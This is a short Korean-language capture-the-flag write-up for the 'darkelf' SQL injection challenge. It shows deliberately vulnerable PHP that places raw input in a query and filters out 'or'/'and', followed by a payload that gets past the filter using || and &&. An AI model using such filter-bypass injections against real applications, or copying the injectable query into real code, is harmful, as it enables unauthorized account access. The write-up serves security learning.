# DARKELF

## code
```php
<?php 
  include "./config.php"; 
  login_chk(); 
  dbconnect();  
  if(preg_match('/prob|_|\.|\(\)/i', $_GET[pw])) exit("No Hack ~_~"); 
  if(preg_match('/or|and/i', $_GET[pw])) exit("HeHe"); 
  $query = "select id from prob_darkelf where id='guest' and pw='{$_GET[pw]}'"; 
  echo "<hr>query : <strong>{$query}</strong><hr><br>"; 
  $result = @mysql_fetch_array(mysql_query($query)); 
  if($result['id']) echo "<h2>Hello {$result[id]}</h2>"; 
  if($result['id'] == 'admin') solve("darkelf"); 
  highlight_file(__FILE__); 
?>
```

## solution
위 코드를 보면 wolfmen과 같은 문제이지만 or과 and가 막혀있다. 그러므로 url 뒤에
```
?pw=' || 1=1 %26%26 id='admin'%23
```
이와 같이 입력을 하게 되면 ||은 or과 같은 의미이고 %26%26(&&)은 and와 같은 의미이기 때문에 id에는 admin이들어가고 pw는 참이 되어서 문제가 풀리게된다.

--------------